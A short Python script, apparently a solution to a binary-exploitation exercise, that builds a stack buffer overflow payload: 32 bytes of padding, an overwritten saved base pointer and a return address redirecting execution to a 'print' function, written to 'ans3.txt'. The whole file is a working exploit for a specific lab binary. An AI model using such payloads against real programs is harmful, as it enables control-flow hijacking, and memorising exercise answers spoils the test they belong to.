buffer = b"A" * 32
safe_rbp = b"\x00\x40\x40\x00\x00\x00\x00\x00"
print = b"\x2b\x12\x40\x00\x00\x00\x00\x00"
payload = buffer + safe_rbp + print
with open("ans3.txt", "wb") as f:
    f.write(payload)
